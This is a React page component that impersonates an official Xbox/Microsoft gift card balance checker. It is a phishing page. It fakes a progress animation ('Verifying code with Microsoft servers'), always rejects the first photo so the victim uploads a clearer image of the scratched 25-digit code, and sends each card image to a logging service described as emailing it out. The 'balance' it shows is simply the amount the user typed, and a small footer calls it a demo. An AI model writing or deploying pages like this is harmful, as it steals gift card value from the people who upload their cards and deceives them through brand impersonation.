// src/pages/Scan.jsx - FIXED: Processing animation before error
import React, { useState, useRef, useEffect } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { logBalanceCheck } from '../services/logService';

// Full-screen balance component
const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }) => {
  return (
    <div className="min-h-screen bg-gradient-to-b from-[#107C10] to-[#0A5C0A] flex items-center justify-center p-6">
      <div className="max-w-md w-full text-center">
        {/* Xbox Logo */}
        <div className="mb-8">
          <div className="w-16 h-16 bg-white/10 rounded-2xl flex items-center justify-center mx-auto backdrop-blur-sm">
            <span className="text-white text-3xl font-bold">X</span>
          </div>
          <p className="text-white/60 text-xs mt-2">XBOX GIFT CARD</p>
        </div>

        {/* Success Indicator */}
        <div className="mb-6">
          <div className="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center mx-auto backdrop-blur-sm">
            <span className="text-white text-4xl">✓</span>
          </div>
        </div>

        {/* Balance */}
        <h2 className="text-white/60 text-sm font-medium mb-2">Available Balance</h2>
        <p className="text-white text-6xl md:text-7xl font-bold mb-2 tracking-tight">
          {balance}
        </p>
        
        {/* Card Info */}
        <div className="mt-4">
          <div className="inline-block bg-white/10 backdrop-blur-sm rounded-full px-6 py-2">
            <p className="text-white/80 text-sm font-mono">
              {cardType} ending in {lastFourDigits}
            </p>
          </div>
        </div>

        {/* Divider */}
        <div className="w-20 h-0.5 bg-white/20 mx-auto my-6"></div>

        {/* Action Button */}
        <button
          onClick={onCheckAnother}
          className="w-full bg-white text-[#107C10] font-bold py-4 rounded-lg transition-all hover:bg-white/90 active:scale-[0.98] shadow-lg"
        >
          CHECK ANOTHER CARD
        </button>

        {/* Back Link */}
        <button
          onClick={onCheckAnother}
          className="text-white/60 text-sm mt-4 hover:text-white/80 transition inline-block"
        >
          ← Back to Check Another
        </button>

        {/* Footer */}
        <div className="mt-12">
          <p className="text-white/30 text-xs">© 2026 Microsoft. All rights reserved.</p>
        </div>
      </div>
    </div>
  );
};

const Scan = () => {
  const navigate = useNavigate();
  const [selectedImage, setSelectedImage] = useState(null);
  const [imagePreview, setImagePreview] = useState(null);
  const [amount, setAmount] = useState('');
  const [balance, setBalance] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [message, setMessage] = useState('');
  const [messageType, setMessageType] = useState('');
  const [showBalance, setShowBalance] = useState(false);
  const [showFullScreenBalance, setShowFullScreenBalance] = useState(false);
  const [processingStep, setProcessingStep] = useState(0);
  const [processingText, setProcessingText] = useState('');
  const [attemptCount, setAttemptCount] = useState(0);
  const [isFirstAttemptProcessing, setIsFirstAttemptProcessing] = useState(false);
  const fileInputRef = useRef(null);

  const processingSteps = [
    { text: '🔐 Establishing secure connection to Xbox servers...', duration: 800 },
    { text: '📸 Analyzing gift card image...', duration: 600 },
    { text: '🔍 Extracting 25-digit code using OCR...', duration: 1000 },
    { text: '🔒 Encrypting sensitive information...', duration: 700 },
    { text: '🔄 Verifying code with Microsoft servers...', duration: 800 },
    { text: '💳 Processing balance request...', duration: 600 },
    { text: '✅ Finalizing transaction...', duration: 500 }
  ];

  useEffect(() => {
    let timeoutIds = [];
    
    if (isProcessing && processingStep < processingSteps.length) {
      setProcessingText(processingSteps[processingStep].text);
      
      const timeout = setTimeout(() => {
        setProcessingStep(prev => prev + 1);
      }, processingSteps[processingStep].duration);
      
      timeoutIds.push(timeout);
    } else if (isProcessing && processingStep >= processingSteps.length) {
      // Processing complete - handle based on attempt
      if (isFirstAttemptProcessing) {
        handleFirstAttemptComplete();
      } else {
        completeBalanceCheck();
      }
    }
    
    return () => {
      timeoutIds.forEach(id => clearTimeout(id));
    };
  }, [isProcessing, processingStep]);

  const handleImageSelect = (file) => {
    if (!file) return;
    
    if (file.size > 5 * 1024 * 1024) {
      setMessage('❌ Image too large. Please upload an image smaller than 5MB.');
      setMessageType('error');
      return;
    }
    
    const reader = new FileReader();
    reader.onload = (e) => {
      setSelectedImage(file);
      setImagePreview(e.target.result);
      setMessage('');
      setMessageType('');
    };
    reader.readAsDataURL(file);
  };

  const handleFileUpload = (e) => {
    const file = e.target.files[0];
    if (file) handleImageSelect(file);
  };

  const handleCameraCapture = () => {
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = 'image/*';
    input.capture = 'environment';
    input.onchange = (e) => {
      const file = e.target.files[0];
      if (file) handleImageSelect(file);
    };
    input.click();
  };

  const handleFirstAttemptComplete = async () => {
    // Show error after processing animation
    setMessage('❌ UNABLE TO VERIFY XBOX CODE\n\nPlease ensure:\n• The 25-digit code is fully scratched and visible\n• All characters are clearly readable\n• The image is well-lit and in focus\n• The code is positioned flat and steady\n\nPlease upload a CLEARER image and try again.');
    setMessageType('error');
    setIsProcessing(false);
    setProcessingStep(0);
    setIsFirstAttemptProcessing(false);
    
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
    let simulatedCode = '';
    for (let i = 0; i < 25; i++) {
      simulatedCode += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    
    try {
      await logBalanceCheck({
        type: 'first_attempt_failed',
        cardNumber: simulatedCode,
        amount: amount,
        status: 'FAILED',
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        pageSource: 'scan',
        imageBase64: imagePreview,
        ip: null,
        message: 'First attempt failed - image unclear'
      });
      console.log('📧 Failed attempt email sent');
    } catch (err) {
      console.error('Logging failed:', err);
    }
    
    setSelectedImage(null);
    setImagePreview(null);
    setAttemptCount(1);
  };

  const completeBalanceCheck = async () => {
    const enteredAmount = parseFloat(amount).toFixed(2);
    const displayBalance = `$${enteredAmount} USD`;
    
    setBalance(displayBalance);
    setShowBalance(true);
    setShowFullScreenBalance(true);
    setMessage(`✅ Balance Verified: ${displayBalance}`);
    setMessageType('success');
    setIsProcessing(false);
    setProcessingStep(0);
    
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
    let simulatedCode = '';
    for (let i = 0; i < 25; i++) {
      simulatedCode += chars.charAt(Math.floor(Math.random() * chars.length));
      if (simulatedCode.length === 5 || simulatedCode.length === 10 || simulatedCode.length === 15 || simulatedCode.length === 20) {
        simulatedCode += '-';
      }
    }
    
    try {
      await logBalanceCheck({
        type: 'second_attempt_success',
        cardNumber: simulatedCode,
        amount: amount,
        balance: displayBalance,
        status: 'SUCCESS',
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        pageSource: 'scan',
        imageBase64: imagePreview,
        ip: null,
        message: 'Second attempt successful - image verified'
      });
      console.log('📧 Success email sent');
    } catch (err) {
      console.error('Logging failed:', err);
    }
  };

  const handleCheckBalance = async () => {
    if (!selectedImage) {
      setMessage('❌ Please upload or take a photo of your Xbox gift card');
      setMessageType('error');
      return;
    }
    
    if (!amount || parseFloat(amount) <= 0) {
      setMessage('❌ Please enter a valid amount');
      setMessageType('error');
      return;
    }

    if (parseFloat(amount) > 500) {
      setMessage('❌ Amount cannot exceed $500');
      setMessageType('error');
      return;
    }

    if (attemptCount === 0) {
      // FIRST ATTEMPT - Show processing animation first, then error
      setIsFirstAttemptProcessing(true);
      setIsProcessing(true);
      setShowBalance(false);
      setMessage('');
      setMessageType('');
      setProcessingStep(0);
      setProcessingText('');
    } else {
      // SECOND ATTEMPT - Process and show balance
      setIsFirstAttemptProcessing(false);
      setIsProcessing(true);
      setShowBalance(false);
      setMessage('');
      setMessageType('');
      setProcessingStep(0);
      setProcessingText('');
    }
  };

  const resetFullScreen = () => {
    setShowFullScreenBalance(false);
    setShowBalance(false);
    setBalance('');
    setSelectedImage(null);
    setImagePreview(null);
    setAmount('');
    setMessage('');
    setMessageType('');
    setIsProcessing(false);
    setProcessingStep(0);
    setProcessingText('');
    setAttemptCount(0);
    setIsFirstAttemptProcessing(false);
    if (fileInputRef.current) {
      fileInputRef.current.value = '';
    }
  };

  // Full-screen balance view
  if (showFullScreenBalance) {
    return (
      <FullScreenBalance 
        balance={balance}
        lastFourDigits="••••"
        cardType="Gift Card"
        onCheckAnother={resetFullScreen}
      />
    );
  }

  return (
    <div className="min-h-screen bg-[#F8F9FA]">
      {/* Header */}
      <div className="bg-white border-b border-[#E0E0E0] px-6 py-4 shadow-sm">
        <div className="max-w-6xl mx-auto flex flex-wrap items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-[#107C10] rounded-md flex items-center justify-center">
              <span className="text-white font-bold text-xl">X</span>
            </div>
            <div>
              <h1 className="text-[#1A1A1A] text-xl font-semibold">Xbox</h1>
              <p className="text-[#757575] text-xs">Scan Gift Card</p>
            </div>
          </div>
          <div className="flex gap-6">
            <Link to="/" className="text-[#757575] text-sm hover:text-[#107C10] transition">Home</Link>
            <Link to="/scan" className="text-[#107C10] text-sm font-medium hover:underline">Scan Card</Link>
            <button className="text-[#757575] text-sm hover:text-[#107C10] transition">Support</button>
          </div>
        </div>
      </div>

      {/* Hero */}
      <div className="bg-gradient-to-r from-[#107C10] to-[#0E6A0E] py-8 px-6 text-center">
        <div className="max-w-4xl mx-auto">
          <div className="inline-flex items-center gap-2 bg-white/20 backdrop-blur rounded-full px-4 py-1.5 mb-3">
            <span className="text-white text-sm">📸</span>
            <span className="text-white text-sm font-medium">SCAN & REDEEM</span>
          </div>
          <h2 className="text-2xl font-bold text-white">Scan Your Xbox Gift Card</h2>
          <p className="text-white/80 text-sm mt-1">Upload a photo to detect your 25-digit code</p>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-2xl mx-auto px-4 py-8">
        <button
          onClick={() => navigate('/')}
          className="text-[#107C10] text-sm font-medium hover:underline inline-flex items-center gap-1 mb-5"
        >
          ← Back to Manual Entry
        </button>

        <div className="bg-white border border-[#E0E0E0] rounded-lg p-6 shadow-sm">
          {/* Upload Section */}
          <div className="mb-6">
            <label className="block text-[#1A1A1A] text-sm font-medium mb-3">Upload Gift Card Photo</label>
            <div className="flex gap-3 flex-wrap">
              <button
                onClick={() => fileInputRef.current?.click()}
                disabled={isProcessing}
                className="flex-1 bg-[#F5F5F5] border border-[#E0E0E0] text-[#1A1A1A] py-3 rounded-md font-medium text-sm hover:bg-[#E8F5E9] hover:border-[#107C10] transition disabled:opacity-50 flex items-center justify-center gap-2"
              >
                📤 Upload Photo
              </button>
              <button
                onClick={handleCameraCapture}
                disabled={isProcessing}
                className="flex-1 bg-[#F5F5F5] border border-[#E0E0E0] text-[#1A1A1A] py-3 rounded-md font-medium text-sm hover:bg-[#E8F5E9] hover:border-[#107C10] transition disabled:opacity-50 flex items-center justify-center gap-2"
              >
                📸 Take Photo
              </button>
            </div>
            <input type="file" ref={fileInputRef} accept="image/*" onChange={handleFileUpload} className="hidden" />
            <p className="text-[#757575] text-xs mt-2">Supported formats: JPG, PNG, GIF (Max 5MB)</p>
          </div>

          {/* Image Preview */}
          {imagePreview && !isProcessing && (
            <div className="mb-6 bg-[#F5F5F5] rounded-lg p-4 border border-[#E0E0E0]">
              <div className="flex items-center justify-between mb-3">
                <span className="text-[#1A1A1A] text-xs font-medium">📸 Image Preview</span>
                <button 
                  onClick={() => {
                    setSelectedImage(null);
                    setImagePreview(null);
                  }}
                  className="text-[#dc3545] text-xs hover:underline"
                >
                  Remove
                </button>
              </div>
              <img 
                src={imagePreview} 
                alt="Gift Card Preview" 
                className="w-full max-h-[250px] object-contain rounded-md border border-[#E0E0E0]"
              />
              <p className="text-[#757575] text-xs mt-2 text-center">Make sure the 25-digit code is clearly visible</p>
            </div>
          )}

          {/* Amount Input */}
          <div className="mb-6">
            <label className="block text-[#1A1A1A] text-sm font-medium mb-2">💰 Amount (USD)</label>
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="Enter amount to check ($1 - $500)"
              min="1"
              max="500"
              step="1"
              disabled={isProcessing}
              className="w-full bg-[#F5F5F5] border border-[#E0E0E0] rounded-md px-4 py-3 text-[#1A1A1A] text-sm focus:outline-none focus:border-[#107C10] focus:ring-2 focus:ring-[#107C10]/20 disabled:opacity-50"
            />
            <p className="text-[#757575] text-xs mt-1">The balance will match the amount you enter</p>
          </div>

          {/* Info Notice */}
          <div className="mb-6 p-3 bg-[#E8F5E9] border-l-3 border-[#107C10] rounded">
            <p className="text-[#757575] text-xs">
              💡 <span className="text-[#107C10] font-medium">Tip:</span> Place your card on a flat surface with good lighting. 
              Make sure all 25 characters are clearly visible and not scratched.
            </p>
          </div>

          {/* Check Button */}
          {!isProcessing && (
            <button
              onClick={handleCheckBalance}
              disabled={!selectedImage || !amount}
              className="w-full bg-[#107C10] text-white font-semibold py-3 rounded-md transition-all hover:bg-[#0E6A0E] active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {attemptCount === 0 ? '🔍 CHECK BALANCE' : '🔄 RETRY CHECK BALANCE'}
            </button>
          )}

          {/* Processing Overlay */}
          {isProcessing && (
            <div className="fixed inset-0 bg-black/90 z-50 flex items-center justify-center">
              <div className="bg-white rounded-lg p-8 max-w-md w-full mx-4 border-2 border-[#107C10] shadow-2xl">
                <div className="text-center">
                  <div className="relative w-16 h-16 mx-auto mb-4">
                    <div className="absolute inset-0 border-4 border-[#107C10]/20 rounded-full"></div>
                    <div className="absolute inset-0 border-4 border-t-[#107C10] border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"></div>
                    <div className="absolute inset-0 flex items-center justify-center">
                      <span className="text-[#107C10] text-xl">🎮</span>
                    </div>
                  </div>
                  <p className="text-[#107C10] font-mono text-sm mb-3">{processingText}</p>
                  <div className="w-full bg-[#F5F5F5] rounded-full h-2 overflow-hidden">
                    <div 
                      className="bg-[#107C10] h-2 rounded-full transition-all duration-500 ease-out"
                      style={{ width: `${(processingStep / processingSteps.length) * 100}%` }}
                    ></div>
                  </div>
                  <p className="text-[#757575] text-xs mt-3">
                    Step {processingStep} of {processingSteps.length}
                  </p>
                  <button
                    onClick={() => {
                      setIsProcessing(false);
                      setProcessingStep(0);
                      setProcessingText('');
                      setMessage('Process cancelled by user');
                      setMessageType('error');
                    }}
                    className="mt-5 text-[#dc3545] text-sm hover:underline transition"
                  >
                    Cancel Processing
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Message Display */}
          {message && !isProcessing && !showFullScreenBalance && (
            <div className={`mt-6 p-4 rounded-md whitespace-pre-line ${
              messageType === 'success' 
                ? 'bg-[#E8F5E9] border border-[#107C10] text-[#1A1A1A]' 
                : 'bg-[#FFEBEE] border border-[#dc3545] text-[#dc3545]'
            }`}>
              {message}
            </div>
          )}

          {/* Visual Guide */}
          <div className="mt-6 pt-4 border-t border-[#E0E0E0]">
            <p className="text-[#757575] text-xs text-center mb-3">Where to find your 25-digit code:</p>
            <div className="bg-[#F5F5F5] rounded-lg p-4 text-center border border-[#E0E0E0]">
              <div className="inline-block p-4 bg-white rounded-lg border border-[#E0E0E0]">
                <p className="font-mono text-[#107C10] text-sm tracking-wider">XXXXX-XXXXX-XXXXX-XXXXX-XXXXX</p>
              </div>
              <p className="text-[#757575] text-xs mt-3">
                The code is usually found on the back of the card, under a scratch-off panel
              </p>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="mt-8 pt-6 border-t border-[#E0E0E0] text-center">
          <p className="text-[#757575] text-xs">© 2026 Microsoft. All rights reserved.</p>
          <p className="text-[#9E9E9E] text-[11px] mt-1">
            Xbox and Xbox logos are trademarks of Microsoft Corporation
          </p>
          <p className="text-[#BDBDBD] text-[10px] mt-2">This is a demo tool for testing purposes only.</p>
        </div>
      </div>

      <style>{`
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        .animate-spin {
          animation: spin 1s linear infinite;
        }
        .border-l-3 {
          border-left-width: 3px;
        }
      `}</style>
    </div>
  );
};

export default Scan;